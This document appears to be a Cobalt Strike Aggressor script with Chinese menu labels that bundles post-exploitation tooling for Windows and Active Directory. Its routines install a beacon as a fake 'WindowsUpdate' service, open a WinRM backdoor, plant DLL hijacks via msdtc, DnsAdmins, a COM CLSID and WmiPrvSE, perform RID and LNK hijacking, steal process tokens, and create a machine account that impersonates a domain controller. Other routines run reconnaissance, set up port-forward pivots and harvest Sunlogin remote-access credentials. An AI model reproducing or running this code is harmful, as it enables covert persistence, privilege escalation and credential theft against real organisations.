sub servicerun{
	$exename = $3["exename"];
	$data = artifact_payload("$3['listener']", "svcexe", "$3['arch']");
	$handle = openf(">$exename");
	writeb($handle, $data);
	closef($handle);
	btask($3["bid"], "生成服务马，Listener:$3['listener'] 位数:$3['arch'] 保存名称:$exename");
	bupload($3["bid"], script_resource($exename));
	bmv($3['bid'], $exename, $3["uploadoutpath"].$exename);
	btask($3["bid"], "上传到$3['uploadoutpath']");
	$command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$exename." start= auto obj= LocalSystem DisplayName= windowsupdate";
	btask($3["bid"], "run $command");
	bshell($3["bid"],  $command);
	btask($3["bid"], "Query WindowsUpdate Service");
	bshell($3["bid"], "sc qc WindowsUpdate");
	btask($3["bid"], "Run WindowsUpdate Service");
	bshell($3["bid"], "sc start WindowsUpdate");
}

sub winrm_set{
	if ($3['bid']) {
		btask($bid ,"setting winrm");
		bshell($bid, "winrm quickconfig -q");
		bshell($bid, 'winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}');
		bshell($bid, "winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=\"$3['port']\"}");
		bshell($bid, "winrm set winrm/config/Client @{TrustedHosts=\"*\"}");
		btask($bid, "winrm config");
		bshell($bid, "winrm e winrm/config/listener");
	#	btask($bid,"客户端连接使用：winrm quickconfig -q\nwinrm set winrm/config/Client @{TrustedHosts="*"}\nwinrs -r:<ip>:<port> -u:<user> -p:<password> <command>\nExample:winrs -r:http://127.0.0.1:80 -u:administrator -p:123456 whoami");
	}else{
		berror($3['bid'], "Not an administrator");
	}
}

sub winrm_config{
	$dialog = dialog("Winrm config", %(port => "80", bid => $bid), &winrm_set);
	dialog_description($dialog, "winrm后门端口设置\nwindows server 2008或以下端口默认为80端口(端口复用)，无法进行修改");
	drow_text($dialog, "port", "port:");
	dbutton_action($dialog, "run");
	dialog_show($dialog);
}


sub usbhistory{
	bpowerpick($bid, "Get-ItemProperty -Path HKLM:\\SYStem\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select FriendlyName");
}

sub checkdomain{
	btask($bid, "test");
	bpowerpick($bid, "\$time=net time /domain;if(\$time -eq \$null){write-host \"机器不在域内\"}else{write-host \"机器在域内\";[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()}");
}

sub deviceget{
	bshell($bid, "wmic logicaldisk get deviceid,FileSystem");
}

sub getinstall{
	bshell($bid, "wmic product get name");
}


sub getosinfo{
	bshell($bid, "wmic os get name,Version,OSArchitecture");
}


sub nicconfiginfo{
	bshell($bid, "wmic NICCONFIG get Description,IPAddress,IPSubnet,MACAddress,DHCPServer");
}


sub computergetinfo{
	bshell($bid, "wmic COMPUTERSYSTEM get UserName,Workgroup,SystemFamily");
	bshell($bid, "wmic cpu get Name,AddressWidth");
	bshell($bid, "wmic MEMORYCHIP get PartNumber,Capacity,Speed");
}

sub usergetinfo{
	bshell($bid, "wmic USERACCOUNT get Name,Domain,SID,Disabled,PasswordChangeable,PasswordRequired");
}

sub groupgetinfo{
	bshell($bid, "wmic group get Description,Name,SID");
}

sub msdtc_config{
	$dll = $3['file'];
	$name = split("\\\\", $dll);
	$dllname = $name[-1];
	$dllname_w = $3['file2']."\\\\oci.dll";
	foreach $id ($bid){
		if(-isadmin $id){
			btask($id, "配置msdtc dll劫持");
			bshell($id, "sc stop msdtc");
			bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
			bupload($id, $dll);
			bmv($id, $dllname, $dllname_w);
			bshell($id, "sc config msdtc start= auto");
			bshell($id, "sc config msdtc obj= LocalSystem");
			bshell($id, "sc start msdtc");
		}else{
			btask($id, "不是Administrator权限");
		}
	}
}

sub msdtc{
	$dialog = dialog("msdtc DLL hijack config", %(file => "",file2 => "C:\\Windows\\System32"), &msdtc_config);
	dialog_description($dialog, "msdtc DLL劫持");
	drow_file($dialog, "file", "DLL Path:");
	drow_text($dialog, "file2", "RHOST Path:");
	dbutton_action($dialog, "RUN");
	dialog_show($dialog);
}

sub dnsadminrun{
	println($3);
	$dll = split("\\\\", $3['dllpath'])[-1];
	$dllname = $3['uploadpath']."raj.dll";
	println($3['uploadpath']."raj.dll");
	bupload!($3['bid'], $3['dllpath']);
	bmv!($3['bid'], $dll, $dllname);
	bshell!($3['bid'], "dnscmd /config /serverlevelplugindll ".$dllname);
	bshell!($3['bid'], "sc stop dns");
	bshell!($3['bid'], "sc start dns");
}

sub dnsadmin_config{
	foreach $id ($bid){
		$dialog = dialog("DnsAdminConfig", %(uploadpath => "C:\\Windows\\System32\\", bid => $id), &dnsadminrun);
		dialog_description($dialog, "DnsAdmins权限维持");
		drow_text($dialog, "uploadpath", "uploadpath:");
		drow_file($dialog, "dllpath", "dllpath:" );
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
}

sub CacheTaskExec{
	btask($3['bid'], "CacheTask任务计划COM接口DLL劫持");
	$dllname = split("\\\\", $3['dllpath'])[-1];
	bupload!($3['bid'], $3['dllpath']);
	bmv!($3['bid'], $dllname, $3['uploadpath']);
	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /ve /t REG_SZ /d $3['uploadpath']");
	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /v ThreadingModel /t REG_SZ /d Both")
}

sub CacheTask{
	foreach $id ($bid){
		$dialog = dialog("CacheTask", %(uploadpath => "C:\\Windows\\Temp\\test.dll", bid => $id), &CacheTaskExec);
		dialog_description($dialog, "CacheTask任务计划COM接口DLL劫持,适用系统:Windows 10/Windows Server 2012或以上");
		drow_text($dialog, "uploadpath", "uploadpath:");
		drow_file($dialog, "dllpath", "dllpath:");
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
}


sub servicebeacon{
	foreach $id ($bid){
		$dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", arch => barch($id) ,exename => "svchost.exe", servicename => "WindowsUpdate", bid => $id), &servicerun);
		dialog_description($dialog, "生成服务马上传执行，进行权限维持");
		drow_text($dialog, "arch", "arch:");
		drow_text($dialog, "uploadoutpath", "uploadoutpath:");
		drow_text($dialog, "servicename",  "servicename:");
		drow_text($dialog, "exename", "outputexename:");
		drow_listener($dialog, "listener", "Listener: ");
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}

}

sub ridquery{
	$command = "\$data=Get-WmiObject -Class Win32_UserAccount | Select-Object Name,SID
foreach(\$n in \$data){
	\$username=\$n.Name
	\$sid=\$n.SID  -split \"-\"
	\$sid=[Convert]::ToString(\$sid[-1],16)
	\$number=\$sid.Length%2
	if(\$number -eq 1){
		\$rid=\"0\"+\$sid
		\$rid=[System.String]::Join(\"\",\$rid[-2..-1]+\$rid[0..1])
	}
	write-host \"Name:\"\$username \"Sid:\"\$sid \"Rid:\"\$rid
}";
	foreach $id ($bid){
		bpowerpick($id, $command);
	}
}

sub ridhijack{
	$handle = openf(script_resource("ridhijack.ps1"));
	$data = readb($handle, -1);
	closef($handle);
	$data = replace($data, "XXXXXXXXXXXX", $3['rid']);
	bpowerpick($3['bid'], $data);
}


sub ridrun{
	foreach $id ($bid){
		$dialog = dialog("Rid Hijack", %(rid => "f401", bid => $id), &ridhijack);
		dialog_description($dialog, "RID劫持，将Guest的RID改为别的用户的RID");
		drow_text($dialog, "rid", "RID:");
		dbutton_action($dialog, "Run");
		dialog_show($dialog);
	}
}

sub lnkreate{
	if (-isFile "test.vbs")
	{
		deleteFile("test.vbs");
	}
	$file = openf(script_resource("lnkcreate.vbs"));
	$data = readb($file, -1);
	$data = replace($data, "lnkname", $3["lnkname"]);
	$data = replace($data, "exename", $3["exename"]);
	$data = replace($data, "argsname", $3["argsname"]);
	$data = replace($data, "directoryname", $3["directoryname"]);
	$data = replace($data, "hostkeyname", $3["hostkeyname"]);
	$handle = openf(">test.vbs");
	writeb($handle, $data);
	closef($file);
	closef($handle);
	btask($3["bid"], "Create Vbs,Upload");
	bupload($3["bid"], "test.vbs");
	btask($3["bid"], "Run Vbs");
	bshell($3["bid"], "cscript test.vbs");
	btask($3["bid"], "Check Desktop default.lnk -> dir C:\\Users\\<CurrentUserName>\\Desktop /a | findstr 'default.lnk'");
	brm($3["bid"], "test.vbs");
}

sub lnkreateconfig{
	foreach $id ($bid){
		$dialog = dialog("lnk快捷键劫持", %(lnkname => "default.lnk", exename => "cmd.exe", argsname => "/c calc.exe", directoryname => "C:", hostkeyname => "CTRL+C", bid => $id), &lnkreate);
		dialog_description($dialog, "参考链接:https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence");
		drow_text($dialog, "lnkname", "lnkname:");
		drow_text($dialog, "exename", "exename:");
		drow_text($dialog, "argsname", "args:");
		drow_text($dialog, "directoryname", "directory:");
		dbutton_action($dialog, "Run");
		dialog_show($dialog);
	}
}

sub userAccountControlidrun{
	foreach $id ($bid){
		$computername = $3["computername"];
		$computerpass = $3["computerpass"];
		btask($id, "Import Module ActiveDirectory");
		bpowershell($id, "Import-Module ActiveDirectory");
		btask($id, "AddComputer User");
		bpowershell($id, "New-ADComputer -Name $computername -AccountPassword (ConvertTo-SecureString -String \"$computerpass\" -Force -AsPlainText)");
		btask($id, "Set ComputerName:$computername userAccountControl=8192");
		bpowershell($id, "\$ADComputer=Get-ADComputer -Identity $computername\;Set-ADObject -Identity \$ADComputer -Replace @{userAccountControl=8192}");
		bpowershell($id, "Get-ADGroupMember -Identity \"Domain Controllers\"");
		blog($id, "computername:$computername computerpass:$computerpass");
		blog($id, "runas /user:<domain>\\$computername\$ /netonly cmd");
	}
}

sub userAccountControlidconfig{
	$dialog = dialog("userAccountControl配置ID设置", %(bid => $bid, computername => "sangfor", computerpass => "sangfor123456"), &userAccountControlidrun);
	dialog_description($dialog, "新建机器账户将userAccountControl ID设置为8192。使用于存在于ActiveDirectory模块的机器上执行");
	drow_text($dialog, "computername", "ComputerName:");
	drow_text($dialog, "computerpass", "ComputerPass:");
	dbutton_action($dialog, "Run");
	dialog_show($dialog);
}

sub javarun {
	foreach $id ($bid){
		$path = $3["path"]. "\\". "java.exe";
		$classpath = $3["classpath"];
		$filename = split("\\\\", $classpath)[-1];
		$classname = replace($filename, ".class", "");
		bupload($id, $classpath);
		bshell($id, "\"$path\" $classname");
		println("$id $path $classname");
		
	}
}

sub javarunconfig{
	$dialog = dialog("java运行class文件(一般可用于执行shellcode)", %(bid => $bid, path => "", classpath => "", remote => "C:\\Users\\Public"), &javarun);
	drow_text($dialog, "path", "JDKPATH:");
	drow_file($dialog, "classpath", "classfilePATH:");
	drow_text($dialog, "remote", "RemoteUploadPath:");
	dbutton_action($dialog, "Run");
	dialog_show($dialog);
}


sub tokenrun_{
	foreach $id ($bid){
		bexecute_assembly($id, script_resource("systemcmd_cs.exe"), "$3['Process'] $3['ExecutePath']");
	}

}

sub tokenrun{
	$dialog = dialog("tokenrun", %(bid => $bid, Process => "winlogon", ExecutePath => "C:\\Windows\\System32\\cmd.exe"), &tokenrun_);
	dialog_description($dialog, "<Process> <ExecutePath> #Process为进程名,ExecutePath为你要运行的EXE路径,如果进程的权限是SYSTEM,提权到SYSTEM杀毒会杀");
	drow_text($dialog, "Process","processname:");
	drow_text($dialog, "ExecutePath", "executepath:");
	dbutton_action($dialog, "Run");
	dialog_show($dialog);
}

sub csharpaddtask_{
	foreach $id ($bid){
		bexecute_assembly($id, script_resource("addtask.exe"), "$3['taskName'] $3['taskPath']");
	}
}

sub csharpaddtask{
	$dialog = dialog("addtask", %(bid => $bid, taskName => "360update", taskPath => "C:\\Windows\\System32\\notepad.exe"), &csharpaddtask_);
	dialog_description($dialog, "<taskName> <taskPath> taskName计划任务的名称,taskPath计划任务的目标程序");
	drow_text($dialog, "taskName","taskName:");
	drow_text($dialog, "taskPath", "taskPath:");
	dbutton_action($dialog, "Run");
	dialog_show($dialog);
}

popup beacon_bottom{
	menu "&权限维持"{
		item "&cs服务马"{
			$bid = $1;
			servicebeacon($bid);
		}

		item "&winrm后门"{
			$bid = $1;
			winrm_config($bid);
		}

		item "&msdtc DLL劫持"{
			$bid = $1;
			msdtc($bid);

		}


		item "&WmiPrvSE劫持"{
			show_message("WmiPrvSE提权机会只有一次，失败就没了。一般系统运行只有一个WmiPrvSE.exe进程，当有超过一个WmiPrvSE.exe进程存在时。无法提权");
			WmiPrvSE_config($bid);
		}
		
		item "&CacheTask任务计划COM接口劫持"{
			CacheTask($bid);
		}
		
		menu "&RID劫持"{
			item "&本地windows用户RID查询"{
				ridquery($bid);
			}
			
			item "&RID劫持"{
				ridrun($bid);
			}
		}
		
		item "&lnk劫持快捷键" {
			lnkreateconfig($bid);
		}
		
		item "&java执行class" {
			javarunconfig($bid);
		}
		
		item "&以某个进程的Token运行EXE"{
			$bid = $1;
			tokenrun($bid);
		}
		
		item "&内存加载(C#)添加计划"{
			$bid = $1;
			csharpaddtask($bid);
		}
		
		menu "&域权限维持" {
			item "&dnsadmin后门"{
				$bid = $1;
				dnsadmin_config($bid);
			}
			item "&userAccountControl将ID设置为8192作为后门" {
					$bid = $1;
					userAccountControlidconfig($bid);
			}
		}

	}

}

sub netsh_exec{
	if ($set eq "port"){
		$lhost = $3['lhost'];
		$rhost = $3['rhost'];
		$lport = $3['lport'];
		$rport = $3['rport'];
		foreach $id ($bid){
			btask($id, "端口转发:$lhost : $lport -> $rhost : $rport");
			bshell($id, "netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost");
			btask($id, "查看端口转发列表");
			bshell($id, "netsh interface portproxy show all");

		}
	}else{
		$lhost = $3['lhost'];
		$lport = $3['lport'];
		foreach $id ($bid){
			btask($id, "删除端口转发：$lhost : $lport");
			bshell($id, "netsh interface portproxy delete v4tov4 listenport=$lport listenaddress=$lhost");
			btask($id, "查看端口转发列表");
			bshell($id, "netsh interface portproxy show all");
		}
	}
}

sub netsh_poort{
	$dialog = dialog("netsh Port",%(lhost => "127.0.0.1",  rhost => "192.168.1.2", lport => "4444", rport => "4444"), &netsh_exec);
	dialog_description($dialog, "netsh端口转发配置\nnetsh端口转发删除");
	if ($set eq "port"){
		drow_text($dialog, "lhost", "LHOST:");
		drow_text($dialog, "rhost", "RHOST:");
		drow_text($dialog, "lport", "LPORT:");
		drow_text($dialog, "rport", "RPORT:");
	}else{
		drow_text($dialog, "lport", "LPORT:");
		drow_text($dialog, "lhost", "LHOST:");
	}
	dbutton_action($dialog, "run");
	dialog_show($dialog);

}

sub WmiPrvSE{
	$dllname = $3['dll'];
	$dllend = split("\\\\", $3['dll'])[-1];
#	println($dllend);
	$uploadpath = $3['uploadpath']."\\".$dllend;
#	println($uploadpath);
	$ps = 	bps($bid, lambda({
		println($data);
	}, $callback => $data));
	foreach $id ($bid){
		btask($id, "WmiPrvSE DLL劫持开始配置");
		if(-isadmin $id){
			btask($id, "当前为管理员权限，杀掉WmiPrvSE.exe进程");
			bshell($id, "taskkill /F /IM WmiPrvSE.exe");
		#	btask($id, "重新启动WmiPrvSE.exe进程");
		#	bshell($id, "WmiPrvSE.exe");
		}
		bupload($id, $dllname);
		bmv($id, $dllend, $uploadpath);
		bshell($id, "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Close /t REG_SZ /d ClosePerfData /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Collect /t REG_SZ /d CollectPerfData /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Library /t REG_SZ /d ".$uploadpath." /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Open /t REG_SZ /d OpenData /F");
		bshell($id, "powershell -c \"Get-WmiObject -List | Where-Object {\$_.Name -Like \"\"Win32_Perf*\"\"\"\"}\"");
	}
	

}

sub WmiPrvSE_config{
	$dialog = dialog("WmiPrvSE_config",%(uploadpath => "C:\\Windows\\Temp"), &WmiPrvSE);
	dialog_description($dialog, "WmiPrvSE劫持\n提权适用于:Windows Server 2008\nWindows 7\n或更低版本\n或者用于做权限维持");
	drow_file($dialog, "dll", "dll:");
	drow_text($dialog, "uploadpath", "upload_path:");
	dbutton_action($dialog, "run");
	dialog_show($dialog);
}

sub GetBeaconId{
	foreach $id ($1){
		return $id;
	}
}

sub SunloginClient{
	btask($1, "向日葵密码解密工具:https://github.com/wafinfo/Sunflower_get_Password");
	btask($1, "向日葵进程检测");
	$processname = "SunloginClient";
	$tasklist = bps($1, lambda({
		global('$pid $name $entry $foundid')
		foreach $entry (split("\n", $2)){
			($name, $null, $pid) = split("\\s+", $entry);
			if(lindexOf($name, $processname) ne $null){
				$foundid++;
				blog2($1, "\c8$name $pid");
			}
		}
		if($foundid ne $null){
			btask($1, "向日葵配置文件获取");
			btask($1, "本机验证码参数：encry_pwd\n本机识别码参数：\c3fastcode(去掉开头字母)\n\c3sunlogincode：判断用户是否登录状态\n请判断config.ini配置文件中是否存在\c3sunlogincode参数,存在为登录状态否则未登录");
			btask($1, "安装版向日葵路径:C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini");
			btask($1, "便携版(绿色版)向日葵路径: C:\\Users\\<UserName>\\AppData\\Roaming\\Oray\\SunloginClientLite\\sys_lite_config.ini");
			btask($1, "便携版(绿色版)整体配置文件: C:\\ProgramData\\Oray\\SunloginClient\\config.ini")
			bshell($1, "type \"C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini\"");
			$currentuser = binfo($1, "user");
			if(lindexOf($currentuser, " *") ne $null){
				$tmp = split(" *", $currentuser);
				$tmplen = size($tmp) - 2;
				$tmpname = "";
				$calc = 0;
				foreach $x ($tmp){
					if($calc ne $tmplen){
						$tmpname .= $x;
						$calc++;
					}
				}
				$currentuser = $tmpname;
			}
			bshell($1, "type \"C:\\Users\\$currentuser\\AppData\\Roaming\\Oray\\SunloginClientLite\\sys_lite_config.ini\"");
			bshell($1, "type \"C:\\ProgramData\\Oray\\SunloginClient\\config.ini\"");
			btask($1, "向日葵配置注册表信息获取");
			$arch = binfo($1, "arch");
			breg_query($1, "HKU\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo", $arch);
			breg_query($1, "HKU\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo", $arch);
		}
	}, $callback => $2));
}

popup beacon_bottom{
	menu "&信息收集"{
		$bid = $1;
		item "&usb历史记录信息收集"{
			usbhistory($bid);
		}

		item "&判断是否存在域"{
			checkdomain($bid);
		}

		item "&获取系统盘符"{
			deviceget($bid);
		}

		item "&已安装的软件"{
			getinstall($bid);
		}

		item "&系统基本信息获取"{
			getosinfo($bid);
		}

		item "&网络信息查询"{
			nicconfiginfo($bid);
		}

		item "&配置查询"{
			computergetinfo($bid);
		}

		item "&用户查询"{
			usergetinfo($bid);
		}

		item "&用户组查询"{
			groupgetinfo($bid);
		}

		menu "&netsh"{
			item "&netsh端口转发设置"{
				$set ="port";
				netsh_poort($bid, $port);
			}

			item "&netsh端口转发列表查询"{
				foreach $id ($bid){
					bshell($id, "netsh interface portproxy show all");
				}
			}

			item "&netsh端口转发删除"{
				$set = "delete";
				netsh_poort($bid, $set);
			}

		}
		
		menu "&常用软件信息收集"{
			item "&向日葵信息收集"{
				SunloginClient(GetBeaconId($bid));
			}
		}
	}
}
